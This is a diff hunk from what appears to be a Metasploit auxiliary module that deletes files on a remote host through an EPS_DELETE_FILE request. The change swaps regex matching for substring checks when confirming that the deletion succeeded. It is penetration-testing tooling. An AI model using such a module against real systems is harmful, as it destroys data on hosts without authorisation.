@@ -94,7 +94,7 @@ class Metasploit4 < Msf::Auxiliary
 				}
 			})
 
-			if res and res.code == 200 and res.body =~ /EPS_DELETE_FILE.Response/ and res.body =~ /#{datastore['DIRNAME']}/ and res.body =~ /#{datastore['FILENAME']}/
+			if res and res.code == 200 and res.body =~ /EPS_DELETE_FILE.Response/ and res.body.include?(datastore['FILENAME']) and res.body.include?(datastore['DIRNAME'])
 				print_good("#{rhost}:#{rport} - File #{datastore['FILENAME']} at #{datastore['DIRNAME']} successfully deleted")
 			elsif res
 				vprint_error("#{rhost}:#{rport} - Response code: " + res.code.to_s)
